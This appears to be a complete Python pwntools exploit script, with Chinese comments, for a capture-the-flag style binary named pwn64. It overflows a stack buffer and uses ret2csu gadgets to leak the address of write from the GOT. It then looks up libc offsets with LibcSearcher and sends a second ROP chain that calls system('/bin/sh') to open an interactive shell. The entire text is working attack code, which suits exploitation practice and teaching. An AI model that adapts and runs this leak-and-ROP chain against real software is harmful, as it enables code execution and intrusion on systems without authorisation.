from pwn import*
from LibcSearcher import*
context(arch='amd64', os='linux', log_level='debug')
p   = process('./pwn64')
elf = ELF('./pwn64')

#write_plt   = elf.plt['write']
write_got   = elf.got['write']
vuln        = elf.symbols['vuln']

gadget1     = 0x400766
gadget2     = 0x400750
pop_rdi     = 0x400773

payload1  = b'a' * (0x100 + 8)
# 调用第一段gadget, 将需要的值写入
# rdi = edi = r13d = 1
# rsi = r14 = write_addr
# rdx = r15 = 8
# #(call r12+rbx*8 = write)
# r12 = write_plt
# #(rbp = rbx + 1)防止jnz跳转
# rbx = 0
# rbp = 1
payload1 += p64(gadget1)
payload1 += p64(0) # add rsp, 8
payload1 += p64(0) # pop rbx
payload1 += p64(1) # pop rbp
payload1 += p64(write_got)# pop r12 // 我这无法直接使用write_plt, 因此换成got表中的write
payload1 += p64(1)# pop r13
payload1 += p64(write_got)# pop r14
payload1 += p64(8)# pop r15
# 调用第二段gadget
# 将r13d, r14, r15分别写入rdi, rsi, rdx并执行write
payload1 += p64(gadget2)
payload1 += b'\0' * (8 * 7) # 填充6个pop和add rsp, 8
payload1 += p64(vuln)

p.recvuntil('Please:\n')
p.send(payload1)
p.recvuntil('Ok.\n')
write = u64(p.recv()[:8])

# 根据write的实际地址计算出system和/bin/sh的地址
libc     = LibcSearcher("write", write)
libcbase = write    - libc.dump("write")
system   = libcbase + libc.dump("system")
binsh    = libcbase + libc.dump("str_bin_sh")

payload2 = b'a' * (0x100 + 8)
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

p.send(payload2)
p.interactive()
